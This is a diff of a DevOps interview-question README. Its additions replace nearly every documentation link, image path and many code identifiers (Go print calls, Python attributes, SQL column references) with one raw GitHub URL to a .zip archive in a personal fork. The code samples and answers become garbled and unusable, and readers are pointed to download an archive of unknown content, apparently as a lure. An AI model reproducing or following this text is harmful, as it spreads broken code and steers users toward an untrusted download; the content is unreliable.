+        after = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
         print(after-before)
         return func
     return wrapper
 
 @deco
 def f():
-    time.sleep(2)
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(2)
     print("************")
 
 a = f()
@@ -4597,13 +4597,13 @@ a = f()
 ```
 class Car:
     def __init__(self, model, color):
-        self.model = model
-        self.color = color
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = model
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = color
 
     def __eq__(self, other):
         if not isinstance(other, Car):
             return NotImplemented
-        return self.model == other.model and self.color == other.color
+        return https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip == https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip and https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip == https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 
 >> a = Car('model_1', 'red')
 >> b = Car('model_2', 'green')
@@ -4805,13 +4805,13 @@ func main() {
     var x int = 101
     var y string
     y = string(x)
-    fmt.Println(y)
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(y)
 }
 ```
 </summary><br><b>
 
 It looks what unicode value is set at 101 and uses it for converting the integer to a string.
-If you want to get "101" you should use the package "strconv" and replace <code>y = string(x)</code> with <code>y = strconv.Itoa(x)</code>
+If you want to get "101" you should use the package "strconv" and replace <code>y = string(x)</code> with <code>y = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(x)</code>
 </b></details>
 
 <details>
@@ -4849,9 +4849,9 @@ const (
 const z = iota
 
 func main() {
-	fmt.Printf("%v\n", x)
-	fmt.Printf("%v\n", y)
-	fmt.Printf("%v\n", z)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("%v\n", x)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("%v\n", y)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("%v\n", z)
 }
 ```
 </summary><br><b>
@@ -4860,16 +4860,16 @@ Go's iota identifier is used in const declarations to simplify definitions of in
 <br>
 `x` and `y` in the first iota group, `z` in the second.
 <br>
-[Iota page in Go Wiki](https://github.com/golang/go/wiki/Iota)
+[Iota page in Go Wiki](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
 <summary>What _ is used for in Go?</summary><br><b>
 
 It avoids having to declare all the variables for the returns values.
-It is called the [blank identifier](https://golang.org/doc/effective_go.html#blank).
+It is called the [blank identifier](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip).
 <br>
-[answer in SO](https://stackoverflow.com/questions/27764421/what-is-underscore-comma-in-a-go-declaration#answer-27764432)
+[answer in SO](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -4886,7 +4886,7 @@ const (
 )
 
 func main() {
-	fmt.Printf("%v\n", x)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("%v\n", x)
 }
 ```
 </summary><br><b>
@@ -4907,30 +4907,30 @@ import (
 )
 
 func main() {
-	var wg sync.WaitGroup
+	var wg https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 
-	wg.Add(1)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(1)
 	go func() {
-		time.Sleep(time.Second * 2)
-		fmt.Println("1")
-		wg.Done()
+		https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip * 2)
+		https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("1")
+		https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
 	}()
 
 	go func() {
-		fmt.Println("2")
+		https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("2")
 	}()
 
-	wg.Wait()
-	fmt.Println("3")
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("3")
 }
 ```
 </summary><br><b>
 
 Output: 2 1 3
 
-[Aritcle about sync/waitgroup](https://tutorialedge.net/golang/go-waitgroup-tutorial/)
+[Aritcle about sync/waitgroup](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
-[Golang package sync](https://golang.org/pkg/sync/)
+[Golang package sync](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -4948,7 +4948,7 @@ func mod1(a []int) {
 		a[i] = 5
 	}
 
-	fmt.Println("1:", a)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("1:", a)
 }
 
 func mod2(a []int) {
@@ -4958,17 +4958,17 @@ func mod2(a []int) {
 		a[i] = 5
 	}
 
-	fmt.Println("2:", a)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("2:", a)
 }
 
 func main() {
 	s1 := []int{1, 2, 3, 4}
 	mod1(s1)
-	fmt.Println("1:", s1)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("1:", s1)
 
 	s2 := []int{1, 2, 3, 4}
 	mod2(s2)
-	fmt.Println("2:", s2)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("2:", s2)
 }
 ```
 </summary><br><b>
@@ -4983,8 +4983,8 @@ Output: <code><br>
 In `mod1` a is link, and when we're using `a[i]`, we're changing `s1` value to.
 But in `mod2`, `append` creats new slice, and we're changing only `a` value, not `s2`.
 
-[Aritcle about arrays](https://golangbot.com/arrays-and-slices/),
-[Blog post about `append`](https://blog.golang.org/slices)
+[Aritcle about arrays](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip),
+[Blog post about `append`](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -5021,17 +5021,17 @@ func (h *IntHeap) Pop() interface{} {
 
 func main() {
 	h := &IntHeap{4, 8, 3, 6}
-	heap.Init(h)
-	heap.Push(h, 7)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(h)
+	https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(h, 7)
 
-  fmt.Println((*h)[0])
+  https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip((*h)[0])
 }
 ```
 </summary><br><b>
 
 Output: 3
 
-[Golang container/heap package](https://golang.org/pkg/container/heap/)
+[Golang container/heap package](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 ## Mongo
@@ -5083,11 +5083,11 @@ as key-value pair, document-oriented, etc.
 ##### Queries
 
 <details>
-<summary>Explain this query: <code>db.books.find({"name": /abc/})</code></summary><br><b>
+<summary>Explain this query: <code>https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip({"name": /abc/})</code></summary><br><b>
 </b></details>
 
 <details>
-<summary>Explain this query: <code>db.books.find().sort({x:1})</code></summary><br><b>
+<summary>Explain this query: <code>https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip().sort({x:1})</code></summary><br><b>
 </b></details>
 
 <details>
@@ -5107,7 +5107,7 @@ as key-value pair, document-oriented, etc.
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| My First Project | Projects | [Exercise](exercises/openshift/projects_101.md) | [Solution](exercises/openshift/solutions/projects_101.md)
+| My First Project | Projects | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ### OpenShift Self Assessment
 
@@ -5312,7 +5312,7 @@ False. It can run on any node.
 <details>
 <summary>What are "Security Context Constraints"?</summary><br><b>
 
-From [OpenShift Docs](https://docs.openshift.com/container-platform/4.7/authentication/managing-security-context-constraints.html): "Similar to the way that RBAC resources control user access, administrators can use security context constraints (SCCs) to control permissions for pods".
+From [OpenShift Docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "Similar to the way that RBAC resources control user access, administrators can use security context constraints (SCCs) to control permissions for pods".
 </b></details>
 
 <details>
@@ -5374,7 +5374,7 @@ If not enough pods are running -> it creates more
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Functions vs. Comparisons | Query Improvements | [Exercise](exercises/sql/improve_query.md) | [Solution](exercises/sql/solutions/improve_query.md)
+| Functions vs. Comparisons | Query Improvements | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ### SQL Self Assessment
 
@@ -5473,10 +5473,10 @@ both the Customers table and Orders table
 <details>
 <summary>How would you show which customer ordered which items?</summary><br><b>
 
-Select c.Customer_Name, o.Item <br>
+Select https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip, https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip <br>
 From Customers c <br>
 Left Join Orders o <br>
-  On c.Customer_ID = o.Customer_ID;
+  On https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip;
 
 </b></details>
 
@@ -5492,8 +5492,8 @@ Group by Customer_ID <br>
 Select Customer_name, TOTAL_PRICE <br>
 From Customers c <br>
 Inner JOIN cat_food f <br>
-  ON c.Customer_ID = f.Customer_ID <br>
-where c.Customer_ID in (Select Customer_ID from cat_food);
+  ON https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip <br>
+where https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip in (Select Customer_ID from cat_food);
 
 Although this was a simple statement, the "with" clause really shines when
 a complex query needs to be run on a table before joining to another. With statements are nice,
@@ -5531,13 +5531,13 @@ When you use a function (`YEAR(purchased_at)`) it has to scan the whole database
 <details>
 <summary>What is Azure Portal?</summary><br><b>
 
-[Microsoft Docs](https://docs.microsoft.com/en-us/learn/modules/intro-to-azure-fundamentals/what-is-microsoft-azure): "The Azure portal is a web-based, unified console that provides an alternative to command-line tools. With the Azure portal, you can manage your Azure subscription by using a graphical user interface."
+[Microsoft Docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "The Azure portal is a web-based, unified console that provides an alternative to command-line tools. With the Azure portal, you can manage your Azure subscription by using a graphical user interface."
 </b></details>
 
 <details>
 <summary>What is Azure Marketplace?</summary><br><b>
 
-[Microsoft Docs](https://docs.microsoft.com/en-us/learn/modules/intro-to-azure-fundamentals/what-is-microsoft-azure): "Azure marketplace helps connect users with Microsoft partners, independent software vendors, and startups that are offering their solutions and services, which are optimized to run on Azure."
+[Microsoft Docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "Azure marketplace helps connect users with Microsoft partners, independent software vendors, and startups that are offering their solutions and services, which are optimized to run on Azure."
 </b></details>
 
 <details>
@@ -5804,7 +5804,7 @@ instances in the project.
 <details>
 <summary>Can you deploy Anthos on AWS?</summary><br><b>
 
-* Yes, Anthos on AWS is now GA. For more read [here](https://cloud.google.com/anthos/gke/docs/aws)
+* Yes, Anthos on AWS is now GA. For more read [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -5996,7 +5996,7 @@ As it does not support stateful applications or sticky sessions, it is suitable 
 <details>
 <summary>Are you familiar with TripleO? How is it different from Devstack or Packstack?</summary><br><b>
 
-You can read about TripleO right [here](https://docs.openstack.org/tripleo-docs/latest)
+You can read about TripleO right [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 #### OpenStack Compute
@@ -6428,7 +6428,7 @@ Elasticserach, Logstash and Kibana are also known as the ELK stack.
 <details>
 <summary>Explain what is Elasticsearch</summary><br><b>
 
-From the official [docs](https://www.elastic.co/guide/en/elasticsearch/reference/current/documents-indices.html):
+From the official [docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "Elasticsearch is a distributed document store. Instead of storing information as rows of columnar data, Elasticsearch stores complex data structures that have been serialized as JSON documents"
 </b></details>
@@ -6436,7 +6436,7 @@ From the official [docs](https://www.elastic.co/guide/en/elasticsearch/reference
 <details>
 <summary>What is Logstash?</summary><br><b>
 	
-From the [blog](https://logit.io/blog/post/the-top-50-elk-stack-and-elasticsearch-interview-questions):
+From the [blog](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "Logstash is a powerful, flexible pipeline that collects, enriches and transports data. It works as an extract, transform & load (ETL) tool for collecting log messages."
 </b></details>
@@ -6592,7 +6592,7 @@ Term Frequency is how often a term appears in a given document and Document Freq
 <summary>You check "Current Phase" under "Index lifecycle management" and you see it's set to "hot". What does it mean?</summary><br><b>
 
 "The index is actively being written to".
-More about the phases [here](https://www.elastic.co/guide/en/elasticsearch/reference/7.6/ilm-policy-definition.html)
+More about the phases [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -6724,11 +6724,11 @@ Total number of documents matching the search results. If not query used then si
 <details>
 <summary>What is a harvester?</summary><br><b>
 
-Read [here](https://www.elastic.co/guide/en/beats/filebeat/current/how-filebeat-works.html#harvester)
+Read [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
-<summary>True or False? a single harvester harvest multiple files, according to the limits set in filebeat.yml</summary><br><b>
+<summary>True or False? a single harvester harvest multiple files, according to the limits set in https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</summary><br><b>
 
 False. One harvester harvests one file.
 </b></details>
@@ -6752,7 +6752,7 @@ You can generate certificates with the provided elastic utils and change configu
 
 According to Martin Kleppmann:
 
-"Many processes running on many machines...only message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses."
+"Many processes running on many https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip message-passing via an unreliable network with variable delays, and the system may suffer from partial failures, unreliable clocks, and process pauses."
 
 Another definition: "Systems that are physically separated, but logically connected"
 </b></details>
@@ -6778,7 +6778,7 @@ According to the CAP theorem, it's not possible for a distributed data store to 
 
 <details>
 <summary>What are the problems with the following design? How to improve it?<br>
-<img src="images/distributed/distributed_design_standby.png" width="500x;" height="350px;"/>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="500x;" height="350px;"/>
 </summary><br><b>
 1. The transition can take time. In other words, noticeable downtime.
 2. Standby server is a waste of resources - if first application server is running then the standby does nothing
@@ -6786,7 +6786,7 @@ According to the CAP theorem, it's not possible for a distributed data store to 
 
 <details>
 <summary>What are the problems with the following design? How to improve it?<br>
-<img src="images/distributed/distributed_design_lb.png" width="700x;" height="350px;"/>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="700x;" height="350px;"/>
 </summary><br><b>
 Issues:
 If load balancer dies , we lose the ability to communicate with the application.
@@ -6811,7 +6811,7 @@ It's an architecture in which data is and retrieved from a single, non-shared, s
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Highly Available "Hello World" | [Exercise](exercises/devops/ha_hello_world.md) | [Solution](exercises/devops/solutions/ha_hello_world.md)
+| Highly Available "Hello World" | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 <details>
 <summary>What happens when you type in a URL in an address bar in a browser?</summary><br><b>
@@ -6835,7 +6835,7 @@ TODO: add more details!
 <details>
 <summary>Explain what is an API</summary><br><b>
 
-I like this definition from [blog.christianposta.com](https://blog.christianposta.com/microservices/api-gateways-are-going-through-an-identity-crisis):
+I like this definition from [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "An explicitly and purposefully defined interface designed to be invoked over a network that enables software developers to get programmatic access to data and functionality within an organization in a controlled and comfortable way."
 </b></details>
@@ -6843,7 +6843,7 @@ I like this definition from [blog.christianposta.com](https://blog.christianpost
 <details>
 <summary>What is an API specification?</summary><br><b>
 
-From [swagger.io](https://swagger.io/resources/articles/difference-between-api-documentation-specification):
+From [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "An API specification provides a broad understanding of how an API behaves and how the API links with other APIs. It explains how the API functions and the results to expect when using the API"
 </b></details>
@@ -6851,7 +6851,7 @@ From [swagger.io](https://swagger.io/resources/articles/difference-between-api-d
 <details>
 <summary>True or False? API Definition is the same as API Specification</summary><br><b>
 
-False. From [swagger.io](https://swagger.io/resources/articles/difference-between-api-documentation-specification):
+False. From [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "An API definition is similar to an API specification in that it provides an understanding of how an API is organized and how the API functions. But the API definition is aimed at machine consumption instead of human consumption of APIs."
 </b></details>
@@ -6988,7 +6988,7 @@ someMultiLineString: >
 They allow you reference values instead of directly writing them and it is used like this:
 
 ```
-username: {{ my.user_name }}
+username: {{ https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip }}
 ```
 </b></details>
 
@@ -7010,7 +7010,7 @@ document_number: 2
 <details>
 <summary>Explain what is a firmware</summary><br><b>
 
-[Wikipedia](https://en.wikipedia.org/wiki/Firmware): "In computing, firmware is a specific class of computer software that provides the low-level control for a device's specific hardware. Firmware, such as the BIOS of a personal computer, may contain basic functions of a device, and may provide hardware abstraction services to higher-level software such as operating systems."
+[Wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "In computing, firmware is a specific class of computer software that provides the low-level control for a device's specific hardware. Firmware, such as the BIOS of a personal computer, may contain basic functions of a device, and may provide hardware abstraction services to higher-level software such as operating systems."
 </b></details>
 
 #### Customers and Service Providers
@@ -7049,7 +7049,7 @@ document_number: 2
   * Enable auto leader election and reduce the imbalance
 percentage ratio
   * Manually rebalance by using kafkat
-  * Configure group.initial.rebalance.delay.ms to 3000
+  * Configure https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip to 3000
   * All of the above
 </summary><br><b>
 </b></details>
@@ -7223,7 +7223,7 @@ Yes, you can use DNS for performing load balancing.
 <summary>What are sticky sessions? What are their pros and cons?</summary><br><b>
 
 Recommended read:
-  * [Red Hat Article](https://access.redhat.com/solutions/900933)
+  * [Red Hat Article](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 Cons:
   * Can cause uneven load on instance (since requests routed to the same instances)
@@ -7280,7 +7280,7 @@ In Copyleft, any derivative work must use the same licensing while in permissive
 <summary>What is faster than RAM?</summary><br><b>
 
 CPU cache.
-[Source](https://www.enterprisestorageforum.com/hardware/cache-memory/)
+[Source](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -7304,7 +7304,7 @@ DNS
 <details>
 <summary>What is the C10K problem? Is it relevant today?</summary><br><b>
 
-https://idiallo.com/blog/c10k-2016
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 ## Storage
@@ -7555,7 +7555,7 @@ Not only this will tell you what is expected from you, it will also provide big 
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Message Board Tables  | Relational DB Tables | [Exercise](exercises/databases/table_for_message_board_system.md) | [Solution](exercises/databases/solutions/table_for_message_board_system.md)
+| Message Board Tables  | Relational DB Tables | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 <details>
 <summary>What is a relational database?</summary><br><b>
@@ -7692,7 +7692,7 @@ Foreign Key: a reference to another table's primary key. This allows you to join
 <details>
 <summary>What is ORM? What benefits it provides in regards to relational databases usage?</summary><br><b>
 
-[Wikipedia](https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping): "is a programming technique for converting data between incompatible type systems using object-oriented programming languages"
+[Wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip%E2%80%93relational_mapping): "is a programming technique for converting data between incompatible type systems using object-oriented programming languages"
 
 In regards to the relational databases:
 
@@ -7706,7 +7706,7 @@ In regards to the relational databases:
 <details>
 <summary>What is DDL?</summary><br><b>
 
-[Wikipedia](https://en.wikipedia.org/wiki/Data_definition_language): "In the context of SQL, data definition or data description language (DDL) is a syntax for creating and modifying database objects such as tables, indices, and users."
+[Wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "In the context of SQL, data definition or data description language (DDL) is a syntax for creating and modifying database objects such as tables, indices, and users."
 </b></details>
 
 ## Regex
@@ -7775,7 +7775,7 @@ Bonus: extract the last word of each line
 <details>
 <summary>What's a service mesh?</summary><br><b>
 
-[This article](https://www.redhat.com/en/topics/microservices/what-is-a-service-mesh) provides a great explanation.
+[This article](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) provides a great explanation.
 </b></details>
 
 <details>
@@ -7815,7 +7815,7 @@ High Availability - Being able to access a resource (in some use cases, using di
 <details>
 <summary>What is the difference between high availability and Disaster Recovery?</summary><br><b>
 
-[wintellect.com](https://www.wintellect.com/high-availability-vs-disaster-recovery): "High availability, simply put, is eliminating single points of failure and disaster recovery is the process of getting a system back to an operational state when a system is rendered inoperative. In essence, disaster recovery picks up when high availability fails, so HA first."
+[https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): "High availability, simply put, is eliminating single points of failure and disaster recovery is the process of getting a system back to an operational state when a system is rendered inoperative. In essence, disaster recovery picks up when high availability fails, so HA first."
 </b></details>
 
 <details>
@@ -7857,25 +7857,25 @@ Also, data inconsistency is a concern with horizontal scaling.
 </b></details>
 
 <details>
-<summary>How would you update each of the services in the following drawing without having app (foo.com) downtime?<br>
-<img src="images/design/cdn-no-downtime.png" width="300x;" height="400px;"/>
+<summary>How would you update each of the services in the following drawing without having app (https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) downtime?<br>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="300x;" height="400px;"/>
 </summary><br><b>
 </b></details>
 
 <details>
 <summary>What is the problem with the following architecture and how would you fix it?<br>
-<img src="images/design/producers_consumers_issue.png" width="400x;" height="300px;"/>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="400x;" height="300px;"/>
 </summary><br><b>
 
 The load on the producers or consumers may be high which will then cause them to hang or crash.<br>
 Instead of working in "push mode", the consumers can pull tasks only when they are ready to handle them. It can be fixed by using a streaming platform like Kafka, Kinesis, etc. This platform will make sure to handle the high load/traffic and pass tasks/messages to consumers only when the ready to get them.
 
-<img src="images/design/producers_consumers_fix.png" width="300x;" height="200px;"/>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="300x;" height="200px;"/>
 </b></details>
 
 <details>
 <summary>Users report that there is huge spike in process time when adding little bit more data to process as an input. What might be the problem?<br>
-<img src="images/design/input-process-output.png" width="300x;" height="200px;"/>
+<img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip" width="300x;" height="200px;"/>
 </summary><br><b>
 </b></details>
 
@@ -7896,13 +7896,13 @@ Instead of working in "push mode", the consumers can pull tasks only when they a
 <details>
 <summary>What is a "cache replacement policy"?</summary><br><b>
 
-Take a look [here](https://en.wikipedia.org/wiki/Cache_replacement_policies)
+Take a look [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
 <summary>Which cache replacement policies are you familiar with?</summary><br><b>
 
-You can find a list [here](https://en.wikipedia.org/wiki/Cache_replacement_policies)
+You can find a list [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -7912,7 +7912,7 @@ You can find a list [here](https://en.wikipedia.org/wiki/Cache_replacement_polic
   * LIFO
   * LRU</summary><br><b>
 
-Read about it [here](https://en.wikipedia.org/wiki/Cache_replacement_policies)
+Read about it [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -7952,9 +7952,9 @@ DNS redirection
 
 #### More System Design Questions
 
-Additional exercises can be found in [system-design-notebook repository](https://github.com/bregman-arie/system-design-notebook).
+Additional exercises can be found in [system-design-notebook repository](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip).
 
-<p align="center"><a href="https://github.com/bregman-arie/system-design-notebook"><img src="images/system_design_notebook.png"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"><img src="https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip"/></a></p>
 
 ## Hardware
 
@@ -8009,7 +8009,7 @@ As defined by Doug Laney:
 <details>
 <summary>What is Data Architecture?</summary><br><b>
 
-An answer from [talend.com](https://www.talend.com/resources/what-is-data-architecture):
+An answer from [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "Data architecture is the process of standardizing how organizations collect, store, transform, distribute, and use data. The goal is to deliver relevant data to people who need it, when they need it, and help them make sense of it."
 </b></details>
@@ -8025,14 +8025,14 @@ An answer from [talend.com](https://www.talend.com/resources/what-is-data-archit
 <details>
 <summary>What is a Data Warehouse?</summary><br><b>
 
-[Wikipedia's explanation on Data Warehouse](https://en.wikipedia.org/wiki/Data_warehouse)
-[Amazon's explanation on Data Warehouse](https://aws.amazon.com/data-warehouse)
+[Wikipedia's explanation on Data Warehouse](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+[Amazon's explanation on Data Warehouse](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
 <summary>What is Data Lake?</summary><br><b>
 
-[Data Lake - Wikipedia](https://en.wikipedia.org/wiki/Data_lake)
+[Data Lake - Wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -8052,7 +8052,7 @@ An answer from [talend.com](https://www.talend.com/resources/what-is-data-archit
 <details>
